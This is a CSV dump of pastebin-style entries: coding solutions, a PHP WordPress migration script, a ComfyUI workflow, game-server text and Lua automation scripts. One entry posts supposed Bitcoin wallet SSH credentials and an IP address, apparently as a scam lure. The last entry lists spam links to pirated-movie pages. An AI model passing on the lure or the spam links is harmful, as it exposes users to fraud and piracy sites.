id,title,username,language,date,content
gTTkzKdJ,Mpscow travel,fenixD3,C++,Sunday 19th of November 2023 11:47:47 AM CDT,"#include <iostream>
#include <cmath>
#include <iomanip>

double get_normalized_angle(double x, double y)
{
    auto angle = std::atan2(y, x);
    if (angle > std::numbers::pi)
    {
        angle -= 2 * std::numbers::pi;
    }
    else if (angle <= -std::numbers::pi)
    {
        angle += 2 * std::numbers::pi;
    }
    return angle;
}

double get_min_distance(double start_x, double start_y, double finish_x, double finish_y)
{
    auto radius_start = std::hypot(start_x, start_y);
    auto radius_finish = std::hypot(finish_x, finish_y);

    auto way_through_center = radius_start + radius_finish;

    auto angle_start = get_normalized_angle(start_x, start_y);
    auto angle_finish = get_normalized_angle(finish_x, finish_y);
    auto angle_between = std::abs(angle_start - angle_finish);

    auto arc_length = radius_start * angle_between;
    auto way_through_arc = arc_length + std::abs(radius_start - radius_finish);

    return std::isless(way_through_center, way_through_arc) ? way_through_center : way_through_arc;
}

int main()
{
    int start_x, start_y, finish_x, finish_y;
    std::cin >> start_x >> start_y >> finish_x >> finish_y;

    std::cout << std::fixed << std::setprecision(12) << get_min_distance(start_x, start_y, finish_x, finish_y) << std::endl;
}
"
MTBTWLgY,Untitled,pacho_the_python,Python,Sunday 19th of November 2023 11:28:34 AM CDT,"def create_force_side(side, member, user_info_dict):
    condition = [current_side for current_side in user_info_dict if member in user_info_dict[current_side]]

    if len(condition) == 0:
        condition.clear()
        if side not in user_info_dict:
            user_info_dict[side] = [member]
        else:
            user_info_dict[side].append(member)

    return user_info_dict


def create_force_user(member, side, user_info_dict):
    for current_side in user_info_dict:
        if member in user_info_dict[current_side]:
            if len(user_info_dict[current_side]) > 1:
                user_info_dict[current_side].pop(member)
                break
            else:
                del user_info_dict[current_side]
                break

    if side in user_info_dict:
        user_info_dict[side].append(member)
    else:
        user_info_dict[side] = [member]

    print(f""{member} joins the {side} side!"")


def force_book():
    user_info_dict = {}

    while True:
        command = input()

        if command == 'Lumpawaroo':
            break

        if '|' in command:
            command = command.split(' | ')
            side = command[0]
            member = command[1]
            create_force_side(side, member, user_info_dict)

        elif '->' in command:
            command = command.split(' -> ')
            member = command[0]
            side = command[1]
            create_force_user(member, side, user_info_dict)

    for data in user_info_dict:
        print(f'Side: {data}, Members: {len(user_info_dict[data])}')
        for name in user_info_dict[data]:
            print(f'! {name}')


force_book()
"
BRB1gCGY,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 19th of November 2023 11:24:06 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT659752"
pspfvHrH,QRcd,Hristomir,Python,Sunday 19th of November 2023 11:04:21 AM CDT,"import pyqrcode
import png
from pyqrcode import QRCode

address = ""https://www.mobile.bg/pcgi/mobile.cgi?act=4&adv=21684763065393651&slink=u8qou0""

url = pyqrcode.create(address)
url.png(""accord.png"", scale=8)"
9Gr4vcFZ,MigrateBlogToWordPress Script,EurenikZ,PHP,Sunday 19th of November 2023 10:48:31 AM CDT,"﻿<?php

/*
1. ""wp_posts"" leeren
2. ""wp_term_relationships"" leeren
3. ""wp_comments"" leeren
4. ""wp_term_taxonomy"" importieren
5. ""wp_terms"" importieren
6. Script aufrufen
7. Blog aufrufen
*/

/*
EINSTELLUNGEN START
Tabellen und Spalten müssen im Script entsprechend angepasst werden.
*/

$domain = 'MeinBlog.tld';

// Verbindung zur alten Datenbank herstellen
$oldDb = new mysqli('localhost', 'BENUTZERNAME_HIER', 'PASSWORT_HIER', 'DATENBANK_HIER');

// Verbindung zur neuen Datenbank herstellen
$newDb = new mysqli('localhost', 'BENUTZERNAME_HIER', 'PASSWORT_HIER', 'DATENBANK_HIER');

/*
EINSTELLUNGEN ENDE
*/

// Überprüfen, ob die Verbindungen erfolgreich waren
if ($oldDb->connect_error || $newDb->connect_error) {
    die('Verbindungsfehler: ' . $oldDb->connect_error . ' | ' . $newDb->connect_error);
}

// SQL-Abfrage für den Datenbanktransfer
$query = ""SELECT * FROM tipps"";
$result = $oldDb->query($query);

// Überprüfen, ob die Abfrage erfolgreich war
if (!$result) {
    die('Abfragefehler: ' . $oldDb->error);
}

$i_blog = 0;
$i_comments = 0;

// Blog-Beiträge migrieren
while ($row = $result->fetch_assoc()) {
	$i_blog++;
    // Inhalte ersetzen und formatieren
    $postTitle = mysqli_real_escape_string($newDb, $row['titel']);
    $postContent = mysqli_real_escape_string($newDb, $row['inhalt']);
    $postDate = date('Y-m-d H:i:s', $row['datum']);
    $postModified = date('Y-m-d H:i:s', $row['lastedit']);
    $postAuthor = 1;

    // Weitere Inhalte generieren
    $postName = strtolower(str_replace(
        ['--', 'ß', 'ä', 'ü', 'ö', 'Ä', 'Ü', 'Ö'],
        ['-','ss','ae','ue','oe','ae','ue','oe'],
        preg_replace('/[^A-Za-z0-9\-]/', '', str_replace(
            ' ',
            '-',
            str_replace('&', 'und', str_replace(
                '&amp;',
                'and',
                str_replace(
                    ' / ',
                    '-',
                    str_replace(
                        '.',
                        '-',
                        str_replace(
                            ' – ',
                            '-',
                            str_replace(
                                ' - ',
                                '-',
                                str_replace(
                                    '+',
                                    'plus',
                                    $postTitle
                                )
                            )
                        )
                    )
                )
            )
        ))
    )));

    $guid = 'https://'.strtolower($domain).'/?p=' . $row['id'];

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_posts
    $insertQuery = ""INSERT INTO wp_posts (ID, post_author, post_date, post_date_gmt, post_content, post_title, post_excerpt, post_status, comment_status, ping_status, post_password, post_name, to_ping, pinged, post_modified, post_modified_gmt, post_content_filtered, post_parent, guid, menu_order, post_type, post_mime_type, comment_count)
                    VALUES (NULL, $postAuthor, '$postDate', '$postDate', '$postContent', '$postTitle', '', 'publish', 'open', 'open', '', '$postName', '', '', '$postModified', '$postModified', '', 0, '$guid', 0, 'post', '', 0)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertQuery)) {
        die('Fehler beim Einfügen: ' . $newDb->error);
    }

    // Kategorie-ID aus der alten Tabelle ""tipps""
    $alteKategorieId = $row['kategorie_id'];

    // Neue Kategorie-ID in ""wp_terms"" um 1 erhöhen
    $neueKategorieId = $alteKategorieId + 1;

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_term_relationships
    $insertTermRelationshipsQuery = ""INSERT INTO wp_term_relationships (object_id, term_taxonomy_id, term_order)
                                    VALUES (LAST_INSERT_ID(), $neueKategorieId, 0)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertTermRelationshipsQuery)) {
        die('Fehler beim Einfügen in wp_term_relationships: ' . $newDb->error);
    }

    // SQL-Abfrage für die Aktualisierung der count-Spalte in wp_term_taxonomy
    $updateTermTaxonomyQuery = ""UPDATE wp_term_taxonomy SET count = count + 1 WHERE term_id = $neueKategorieId"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($updateTermTaxonomyQuery)) {
        die('Fehler beim Aktualisieren von wp_term_taxonomy: ' . $newDb->error);
    }
}

// Kommentare migrieren
// SQL-Abfrage für die Kommentare in comments
$commentsQuery = ""SELECT * FROM comments ORDER BY datum ASC"";
$commentsResult = $oldDb->query($commentsQuery);

// SQL-Abfrage für die Antworten in comments_answers
$answersQuery = ""SELECT * FROM comments_answers ORDER BY datum ASC"";
$answersResult = $oldDb->query($answersQuery);

// Antworten in ein Array umwandeln
$answersArray = array();
while ($answerRow = $answersResult->fetch_assoc()) {
    $answersArray[] = $answerRow;
}

// Schleife für Kommentare
while ($commentRow = $commentsResult->fetch_assoc()) {
	$i_comments++;
    // Inhalte formatieren
    $commentPostID = $commentRow['tipp_id'];
    $commentAuthor = mysqli_real_escape_string($newDb, $commentRow['name']);
    $commentDate = date('Y-m-d H:i:s', $commentRow['datum']);
    $commentContent = mysqli_real_escape_string($newDb, $commentRow['kommentar']);
    $commentEmail = $commentRow['email'];

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_comments
    $insertCommentQuery = ""INSERT INTO wp_comments (comment_post_ID, comment_author, comment_date, comment_date_gmt, comment_content, comment_author_email, comment_approved, comment_type, comment_parent, user_id)
                           VALUES ($commentPostID, '$commentAuthor', '$commentDate', '$commentDate', '$commentContent', '$commentEmail', 1, 'comment', 0, $user_id)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertCommentQuery)) {
        die('Fehler beim Einfügen von Kommentaren: ' . $newDb->error);
    }

    // Schleife für Antworten
    foreach ($answersArray as $answerRow) {
        // Wenn die Antwort zur aktuellen Kommentar-ID gehört
        if ($answerRow['comment_id'] == $commentRow['id']) {
            // Inhalte formatieren
            $answerPostID = $answerRow['tipp_id'];
            $answerAuthor = mysqli_real_escape_string($newDb, $answerRow['name']);
            $answerDate = date('Y-m-d H:i:s', $answerRow['datum']);
            $answerContent = mysqli_real_escape_string($newDb, $answerRow['antwort']);
            $answerEmail = $answerRow['email'];

            // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_comments für Antworten
            $insertAnswerQuery = ""INSERT INTO wp_comments (comment_post_ID, comment_author, comment_date, comment_date_gmt, comment_content, comment_author_email, comment_approved, comment_type, comment_parent, user_id)
                                 VALUES ($answerPostID, '$answerAuthor', '$answerDate', '$answerDate', '$answerContent', '$answerEmail', 1, 'comment', LAST_INSERT_ID(), $user_id)"";

            // Überprüfen, ob die Abfrage erfolgreich war
            if (!$newDb->query($insertAnswerQuery)) {
                die('Fehler beim Einfügen von Antworten: ' . $newDb->error);
            }
        }
    }
}

// Verbindungen schließen
$oldDb->close();
$newDb->close();

echo 'Migration abgeschlossen! '.$i_blog.' Blog-Beiträge und '.$i_comments.' Kommentare wurden migriert.';
?>"
yx5i1waV,NP,VMaksimoski008,C++,Sunday 19th of November 2023 10:37:02 AM CDT,"#include <bits/stdc++.h>

#define pb push_back
#define eb emplace_back
#define sz(x) (int)x.size()
#define all(x) x.begin(), x.end()
#define uniq(x) x.erase(unique(all(x)), x.end())
#define rall(x) x.rbegin(), x.rend()
//#define int long long

using namespace std;

using ll = long long;
using ull = unsigned long long;
using ld = long double;
using pii = pair<int, int>;
using pll = pair<ll, ll>;

const int mod = 750083;
const int LOG = 20;
const int maxn = 1e5 + 5;
const double eps = 1e-9;

void setIO() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);
    cout.tie(0);
}

int32_t main() {
    setIO();

    string a, b;
    cin >> a >> b;
   
    int n = sz(a), m = sz(b);
    int dp_min[n+1][m+1], dp[n+1][m+1];
    bool used[n+1][m+1];
    memset(dp, 0, sizeof(dp));
    memset(used, 0, sizeof(used));
    dp_min[0][0] = 0;
    used[0][0] = 1, used[n][m] = 1;

    for(int i=0; i<=n; i++) { 
        for (int j=0; j<=m; j++) {  
            if(!i) dp_min[i][j] = j; 
            else if(!j) dp_min[i][j] = i; 
            else if (a[i-1] == b[j-1]) dp_min[i][j] = 1 + dp_min[i-1][j-1]; 
            else dp_min[i][j] = 1 + min(dp_min[i-1][j], dp_min[i][j-1]); 
        } 
    } 

    queue<pii> q;
    q.push({ n, m });
    while(!q.empty()) {
        int i = q.front().first;
        int j = q.front().second;
        q.pop();

        if(a[i-1] == b[j-1]) {
            if(dp_min[i-1][j-1] + 1 == dp_min[i][j] && !used[i-1][j-1]) {
                q.push({ i-1, j-1 });
                used[i-1][j-1] = 1;
            }
        } else {
            if(dp_min[i-1][j] + 1 == dp_min[i][j] && !used[i-1][j]) {
                q.push({ i-1, j });
                used[i-1][j] = 1;
            }
            if(dp_min[i][j-1] + 1 == dp_min[i][j] && !used[i][j-1]) {
                q.push({ i, j-1 });
                used[i][j-1] = 1;
            }
        }
    }

    for(int i=0; i<=n; i++) {
        for(int j=0; j<=m; j++) cout << used[i][j];
        cout << '\n';
    }

    dp[0][0] = 1;
    for(int i=0; i<=n; i++) {
        for(int j=0; j<=m; j++) {
            if(!used[i][j]) continue;
            if(!i && !j) continue;

            if(!i && used[i][j-1]) {
                dp[i][j] += dp[i][j-1];
                dp[i][j] %= mod;
            }

            if(!j && used[i-1][j]) {
                dp[i][j] += dp[i-1][j];
                dp[i][j] %= mod;
            }

            if(!i || !j) continue;

            if(a[i-1] == b[j-1] && used[i-1][j-1]) {
                dp[i][j] += dp[i-1][j-1];
                dp[i][j] %= mod;
            } else {
                if(used[i-1][j]) {
                    dp[i][j] += dp[i-1][j];
                    dp[i][j] %= mod;
                }

                if(used[i][j-1]) {
                    dp[i][j] += dp[i][j-1];
                    dp[i][j] %= mod;
                }
            }
        }
    }

    cout << dp[n][m] << '\n';
    return 0;
}"
7uAVYB7J,ComfyUI workflow for using OpenPose,Satscape,JSON,Sunday 19th of November 2023 10:22:55 AM CDT,"{
  ""last_node_id"": 62,
  ""last_link_id"": 140,
  ""nodes"": [
    {
      ""id"": 34,
      ""type"": ""ControlNetLoader"",
      ""pos"": [
        290,
        -420
      ],
      ""size"": {
        ""0"": 457.5661315917969,
        ""1"": 58
      },
      ""flags"": {},
      ""order"": 0,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""CONTROL_NET"",
          ""type"": ""CONTROL_NET"",
          ""links"": [
            60
          ],
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""ControlNetLoader""
      },
      ""widgets_values"": [
        ""control_v11p_sd15_openpose_fp16.safetensors""
      ]
    },
    {
      ""id"": 55,
      ""type"": ""VAEDecode"",
      ""pos"": [
        1555.358897816051,
        191.0334347811612
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 46
      },
      ""flags"": {},
      ""order"": 11,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""samples"",
          ""type"": ""LATENT"",
          ""link"": 125
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": 126
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            140
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""VAEDecode""
      }
    },
    {
      ""id"": 52,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        322,
        -100
      ],
      ""size"": {
        ""0"": 400,
        ""1"": 200
      },
      ""flags"": {},
      ""order"": 6,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 115
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            128
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""A person""
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 53,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        319,
        145
      ],
      ""size"": {
        ""0"": 400,
        ""1"": 200
      },
      ""flags"": {},
      ""order"": 7,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 119
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            117
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""text""
      ],
      ""color"": ""#322"",
      ""bgcolor"": ""#533""
    },
    {
      ""id"": 51,
      ""type"": ""KSampler"",
      ""pos"": [
        1055,
        238
      ],
      ""size"": {
        ""0"": 437.8135070800781,
        ""1"": 671.9424438476562
      },
      ""flags"": {},
      ""order"": 10,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 114
        },
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 130
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 117
        },
        {
          ""name"": ""latent_image"",
          ""type"": ""LATENT"",
          ""link"": 139,
          ""slot_index"": 3
        }
      ],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            125
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""KSampler""
      },
      ""widgets_values"": [
        1347568955296,
        ""randomize"",
        35,
        7,
        ""euler"",
        ""normal"",
        1
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 50,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        -120,
        29
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 1,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            114
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            115,
            119
          ],
          ""shape"": 3,
          ""slot_index"": 1
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            121
          ],
          ""shape"": 3,
          ""slot_index"": 2
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CheckpointLoaderSimple""
      },
      ""widgets_values"": [
        ""epicRealism_sd15.safetensors""
      ]
    },
    {
      ""id"": 32,
      ""type"": ""ControlNetApply"",
      ""pos"": [
        800,
        -270
      ],
      ""size"": {
        ""0"": 317.4000244140625,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 9,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""conditioning"",
          ""type"": ""CONDITIONING"",
          ""link"": 128
        },
        {
          ""name"": ""control_net"",
          ""type"": ""CONTROL_NET"",
          ""link"": 60,
          ""slot_index"": 1
        },
        {
          ""name"": ""image"",
          ""type"": ""IMAGE"",
          ""link"": 138
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            130
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""ControlNetApply""
      },
      ""widgets_values"": [
        1
      ]
    },
    {
      ""id"": 58,
      ""type"": ""EmptyLatentImage"",
      ""pos"": [
        515,
        409
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 106
      },
      ""flags"": {},
      ""order"": 2,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            139
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""EmptyLatentImage""
      },
      ""widgets_values"": [
        512,
        512,
        1
      ]
    },
    {
      ""id"": 61,
      ""type"": ""Note"",
      ""pos"": [
        295,
        -521
      ],
      ""size"": [
        445.5208213771756,
        58.870972000683764
      ],
      ""flags"": {},
      ""order"": 3,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""You'll need the OpenPose controlnet selected here I use\n\""control_v11p_sd15_openpose_fp16.safetensors\""""
      ],
      ""color"": ""#432"",
      ""bgcolor"": ""#653""
    },
    {
      ""id"": 60,
      ""type"": ""LoadImage"",
      ""pos"": [
        -182,
        -351
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 102
      },
      ""flags"": {},
      ""order"": 4,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            138
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""MASK"",
          ""type"": ""MASK"",
          ""links"": null,
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""LoadImage""
      },
      ""widgets_values"": [
        null,
        ""image""
      ]
    },
    {
      ""id"": 62,
      ""type"": ""Note"",
      ""pos"": [
        -172,
        -461
      ],
      ""size"": [
        301.7019565734173,
        64.23535472660637
      ],
      ""flags"": {},
      ""order"": 5,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""Load your open pose image here""
      ],
      ""color"": ""#432"",
      ""bgcolor"": ""#653""
    },
    {
      ""id"": 20,
      ""type"": ""SaveImage"",
      ""pos"": [
        1818,
        198
      ],
      ""size"": {
        ""0"": 821.7040405273438,
        ""1"": 834.4818115234375
      },
      ""flags"": {},
      ""order"": 12,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 140,
          ""slot_index"": 0
        }
      ],
      ""properties"": {},
      ""widgets_values"": [
        ""OpenPose""
      ]
    },
    {
      ""id"": 54,
      ""type"": ""Reroute"",
      ""pos"": [
        1125,
        53
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 8,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 121
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""VAE"",
          ""links"": [
            126
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    }
  ],
  ""links"": [
    [
      60,
      34,
      0,
      32,
      1,
      ""CONTROL_NET""
    ],
    [
      114,
      50,
      0,
      51,
      0,
      ""MODEL""
    ],
    [
      115,
      50,
      1,
      52,
      0,
      ""CLIP""
    ],
    [
      117,
      53,
      0,
      51,
      2,
      ""CONDITIONING""
    ],
    [
      119,
      50,
      1,
      53,
      0,
      ""CLIP""
    ],
    [
      121,
      50,
      2,
      54,
      0,
      ""*""
    ],
    [
      125,
      51,
      0,
      55,
      0,
      ""LATENT""
    ],
    [
      126,
      54,
      0,
      55,
      1,
      ""VAE""
    ],
    [
      128,
      52,
      0,
      32,
      0,
      ""CONDITIONING""
    ],
    [
      130,
      32,
      0,
      51,
      1,
      ""CONDITIONING""
    ],
    [
      138,
      60,
      0,
      32,
      2,
      ""IMAGE""
    ],
    [
      139,
      58,
      0,
      51,
      3,
      ""LATENT""
    ],
    [
      140,
      55,
      0,
      20,
      0,
      ""IMAGE""
    ]
  ],
  ""groups"": [],
  ""config"": {},
  ""extra"": {},
  ""version"": 0.4
}"
PFDXEB7M,Azarus SCP:SL HRP #0,Bonjemus_YT,CSS,Sunday 19th of November 2023 09:59:21 AM CDT,"<align=center><size=35><b><color=#5534be>Bienvenue sur Azarus</color></b></size></align>
 
<color=#8f75e0>Des rôles, des objets et mêmes des SCP supplémentaires vous attendent !</color>

<size=17><color=#cc1f1f><b>3 règles simples à connaître :</color></b>
1. les insultes sont interdites.
2. La tricherie/utilisation d'exploit est interdite.
3. Les soundboards à caractère déplacées sont proscrites.
 
Pour nous rejoindre :</size>
<size=25>
> <link=""https://discord.gg/2rffSApHdD""><color=#795cd4><u>Discord</u></color></link> <size=13>(cliquez dessus)</size>
 
> <link=""https://www.patreon.com/FondationAzarus""><color=#fff984><u>Patreon</u></color></link></size> <size=13>(cliquez dessus)</size>
</size>
 
<color=#fff9ac>Pour en apprendre plus sur nos fonctionnalités uniques n’hésitez pas à poser vos questions sur le Discord ou directement en jeu (lorsque vous êtes spectateur par exemple).</color>
 
 
<b>Pour nous contacter :</b> <color=#795cd4>azarusscpsl@gmail.com</color>
<i>Ou passez par Discord : les MP des Fondateurs sont toujours ouverts.</i>"
Nz3UBth9,mekanismEnergyStorage,DafTag,Lua,Sunday 19th of November 2023 09:29:46 AM CDT,"local component = require(""component"")
local sides = require(""sides"")

-- Remplacez ces coordonnées par celles de votre bloc de stockage Mekanism
local mekanismStorage = component.proxy(component.list(""mekanism:creative_bin"")[1])

-- Fonction pour récupérer les informations du système de stockage Mekanism
function getMekanismStorageInfo()
    local info = {}

    -- Récupérer la capacité totale du stockage
    info.totalCapacity = mekanismStorage.getStorageSize()

    -- Récupérer l'espace actuellement utilisé dans le stockage
    info.usedCapacity = mekanismStorage.getStorageSize() - mekanismStorage.getStorageSpace()

    -- Récupérer une liste des articles stockés avec leurs quantités
    info.itemList = mekanismStorage.listAvailableItems()

    return info
end

-- Fonction pour afficher les informations
function printStorageInfo(info)
    print(""Capacité totale du stockage: "" .. info.totalCapacity .. "" items"")
    print(""Espace utilisé: "" .. info.usedCapacity .. "" items"")
    
    print(""\nListe des articles stockés:"")
    for item, quantity in pairs(info.itemList) do
        print(item .. "": "" .. quantity)
    end
end

-- Exécution du programme
local storageInfo = getMekanismStorageInfo()
printStorageInfo(storageInfo)"
uVGYNpn1,Untitled,Creadth,Lua,Sunday 19th of November 2023 09:23:00 AM CDT,"function redstonePulse(side)
    local status = redstone.getOutput(side);
    redstone.setOutput(side, not status);
	os.sleep(0.05);
    redstone.setOutput(side, status);
end

local readyChestSide = ""top"";
local beltInvertorSide = ""back"";
local seedInputSide = ""bottom"";

local grownCrystalName = ""appliedenergistics2:purified_certus_quartz_crystal"";

--local monitor = peripheral.wrap('right');
local belt = peripheral.wrap('right');
local items
--monitor.setCursorPos(1,1);
--monitor.setTextScale(0.5);
redstone.setOutput(beltInvertorSide, false)
--monitor.write('Detecting...');
redstone.setOutput(readyChestSide, true);
redstone.setOutput(seedInputSide, true);
local ticksWithoutItem = 0;
print('Detecting')
while true do
    items = belt.list();
    if #items > 0 then
        ticksWithoutItem = 0;
        --monitor.clear();
        local item = belt.getItemDetail(1);
        if (item.name ~= grownCrystalName) then
            print(""Crystal is not ready, another iteration"");
            redstone.setOutput(beltInvertorSide, true);
            os.sleep(4);
            redstone.setOutput(beltInvertorSide, false)
        else
            print(""Crystal is ready!"");
            redstonePulse(readyChestSide);
            redstonePulse(seedInputSide);
        end
    else
        ticksWithoutItem=ticksWithoutItem+1;
        if (ticksWithoutItem > 600) then
            print(""No items detected on the belt for 600 ticks, requesting another item"");
            redstonePulse(seedInputSide);
            ticksWithoutItem = 0;
        end
    end
    os.sleep(0.1);
end"
d9TsYPAA,.t fortucat,h93f82b3,Lua,Sunday 19th of November 2023 09:03:29 AM CDT,"{lua:
fortunes = {
    ""Am I cat food? Or am I cat"",
    ""We cats are smarter than dogs. You can't get eight cats to pull a sled through the snow."",
	""Hai, Kitty Luv? Are you here to purrrr our friendship?"",
	""I just wanted to say that I love being a cat. My home is big, and my food bowl is always full."",
	""What's the recipe for purrrfect happiness? Cat food."",
	""Cats have a lot to be smug about. They're notorious for being able to stare through people without being caught."",
	""I'm so forever and everlastingly thankful for my cat. I don't even have to pay him."",
	""Take a cat and make it a little cuter, and you've got yourself Stinky."",
	""I love that little mouse house you made!"",
	""I can read your mind, and I know what you’re thinking. Your next move is to scratch my head or rub my belly."",
	""Take a cat and make it a little cuter, and you've got yourself Stinky."",
	""Teamwork makes the cat food roll."",
	""I don't sleep as much as I'm just resting my eyes."",
	""It's tough to shower when you're covered in fur, but I always make it work."",
	""If I'm not out prowling for my next victim tonight, it might be because you are."",
	""My alarm clock is smarter than yours."",
	""I don't mind! Your sloppy kisses are sweeter than any human would be! 😻"",
	""I have forgiven you for your endless barrage of abuse. Now, about that broom..."",
	""If I were a dog, they'd call me a lapdog. But since I'm a cat, they call me 'that asshole beside you that won't get up.'"",
	""What a hyper night it's going to be."",
	""What'd you say? I wasn't paying attention. What's that? You love me? Whatever."",
	""My love is as steady as the tides."",
	""I don't have a good doctor. I have a great doctor, and the best nurse."",
	""It's time for a little action myself. You should get out of the way."",
	""I'm just gonna lay right here for a while."",
	""If my head explodes, do not resuscitate."",
	""Walk. Not. Run."",
	""It's not a scratch, it's a badge of honor."",
	""You say that about everything."",
	""The future is here, and so am I."",
	""I'm listening."",
	""You make me happy. And that is sad."",
	""I thought I was special until I realized I had renal failure."",
	""I'm going to enjoy it."",
	""I can't drink right now. I have work in the morning."",
	""Stop trying to sound smart. It's nauseating."",
	""The weather outside is young and pretty."",
	""Turbulence is my favorite side dish."",
	""Be patient."",
	""It's so cold. Like, really cold."",
	""Look, I just want to be happy. Okay?"",
	""You are an interesting person."",
	""Someone told me I was a genius, and I believed them."",
	""I'll never forget how hard that was."",
	""I lost my cat. I cannot live with myself for this."",
	""The part-time job is the best part of my life."",
	""I know your secret. Don't worry."",
	""After that, I had a long nap."",
	""Do you think the majority of people in this world are evil?"",
	""Why do people ask about other people at other times? I'm woonderin!"",
	""I'd like to be the subject of a cat study because as soon as you hold me, I melt. And I mean MELT."",
	""Why use nine lives when one is enough?"",
	""I'm not ignoring you; I'm just pretending not to care."",
	""When life gives you mice, make mouse-ade."",
	""Why sleep on the bed when you can sleep on the edge of parallel realities?"",
	""There is no such thing as a lost cat."",
}

annotators = {
    "":smiley_cat: **smiley cat says:** "",
	"":smirk_cat: **smirk cat says:** "",
	"":smile_cat: **smile cat says:** "",
	"":crying_cat_face: **crying cat says:** "",
	"":cat: **cat says:** "",
}

function get_random_element(table)
    local index = math.random(1, #table)
    return table[index]
end

function get_random_fortune()
    local fortune = get_random_element(fortunes)
    local emoji = get_random_element(annotators)
    return emoji .. "" "" .. fortune
end

function main()
    local fortune = get_random_fortune()
    print(fortune)
end

main()
}"
TdHzstKi,esghseh,gadungw71,PHP,Sunday 19th of November 2023 08:48:58 AM CDT,"https://gamma.app/public/-HD-The-Undertaker-HD-1080p-zm2wwhnkmp3mbsm
https://www.taskade.com/p/2023-the-undertaker-hd-01HFK7KBMFQN5485M6S2VFA3YD
https://player.soundon.fm/p/0cad59d7-4b87-42ed-9c66-2745237122c6
https://gamma.app/public/-The-Undertaker-2023-HD-HD1080p-657u0phpdx5uvtv
